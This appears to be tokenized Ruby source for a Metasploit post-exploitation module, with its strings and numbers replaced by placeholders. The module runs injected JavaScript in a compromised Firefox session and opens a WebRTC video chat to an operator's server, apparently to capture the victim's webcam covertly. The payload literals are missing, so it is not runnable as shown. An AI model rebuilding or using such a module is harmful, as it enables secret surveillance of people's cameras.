require <str> require <str> class Metasploit3 < Msf :: Post include Msf :: Exploit :: Remote :: FirefoxPrivilegeEscalation include Msf :: Post :: WebRTC def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] ] , <str> = > <str> ) ) register_options ( [ OptBool . new ( <str> , [ false , <str> , false ] ) , OptBool . new ( <str> , [ false , <str> , false ] ) , OptInt . new ( <str> , [ false , <str> , - <int> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def run unless os_check print_error <str> return end server = datastore [ <str> ] offerer_id = Rex :: Text . rand_text_alphanumeric ( <int> ) channel = Rex :: Text . rand_text_alphanumeric ( <int> ) result = js_exec ( js_payload ( server , offerer_id , channel ) ) if datastore [ <str> ] print_status <str> else if result . present? print_status result connect_video_chat ( server , channel , offerer_id ) else print_warning <str> end end end def os_check user_agent = js_exec ( <str> ) user_agent !~ <str> end def js_payload ( server , offerer_id , channel ) interface = load_interface ( <str> ) api = load_api_code interface . gsub! ( <str> , server ) interface . gsub! ( <str> , channel ) interface . gsub! ( <str> , offerer_id ) if datastore [ <str> ] > <int> api << <str> datastore [ <str> ] * <int> <str> end url = if datastore [ <str> ] <str> else <str> end name = if datastore [ <str> ] Rex :: Text . rand_text_alphanumeric ( <int> ) else <str> end <str> Rex :: Text . encode_base64 ( interface ) <str> url <str> name <str> end end 
